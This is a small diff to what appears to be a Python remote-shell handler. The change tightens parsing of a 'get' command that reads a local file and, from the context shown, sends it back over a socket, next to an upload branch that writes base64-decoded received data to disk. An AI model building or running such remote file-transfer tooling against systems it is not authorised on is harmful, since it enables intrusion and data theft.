@@ -103,7 +103,7 @@ def shell(_s):
                 file_data = reliable_recv(_s)
                 f.write(base64.b64decode(file_data))
                 f.close()
-        elif cmd[:3] == 'get' and len(cmd[4:]) > 1:
+        elif cmd[:3] == 'get' and len(cmd[4:]) > 1 and cmd[3:4] == ' ':
             try:
                 with open(cmd[4:], 'rb') as f:
                     file_data = f.read()
